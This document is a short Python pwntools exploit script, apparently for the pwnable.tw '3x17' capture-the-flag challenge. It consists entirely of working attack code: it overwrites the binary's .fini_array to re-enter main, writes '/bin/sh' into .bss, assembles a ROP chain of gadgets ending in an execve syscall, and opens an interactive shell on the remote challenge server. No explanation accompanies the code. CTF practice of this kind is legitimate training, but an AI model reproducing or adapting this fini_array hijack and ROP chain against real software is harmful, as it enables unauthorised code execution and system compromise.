#Exploit for pwnable.tw/3x17
from pwn import *

target = process('./3x17')
target = remote('chall.pwnable.tw', 10105)

#0x00000000004b40f0 - 0x00000000004b4100 is .fini_array

fini	= 0x00000000004b40f0
finiexe	= 0x0000000000402960
entry	= 0x0000000000401a50
mainadd	= 0x0000000000401ba3
main	= 0x0000000000401b6d
bss	= 0x00000000004b9400
ropAddr = 0x00000000004b4100

popRsi  = p64(0x0000000000406c30)
popRax  = p64(0x000000000041e4af)
popRdx  = p64(0x0000000000446e35)
popRdi  = p64(0x0000000000401696)
syscall = p64(0x00000000004022b4)
popRsp  = p64(0x0000000000402ba9)
ret	= p64(0x0000000000401c4b)

def write(addr, data):
	print target.recvuntil("addr:")
	target.sendline(str(addr))
	print target.recvuntil("data:")
	target.send(data)
	
write(fini, p64(finiexe)+p64(main))
write(bss, "/bin/sh\x00")
write(ropAddr + 0x00, popRdi + p64(bss))
write(ropAddr + 0x10, popRsi + p64(0)  )
write(ropAddr + 0x20, popRdx + p64(0)  )
write(ropAddr + 0x30, popRax + p64(59) )
write(ropAddr + 0x40, syscall	       )
write(fini, ret)

target.interactive()
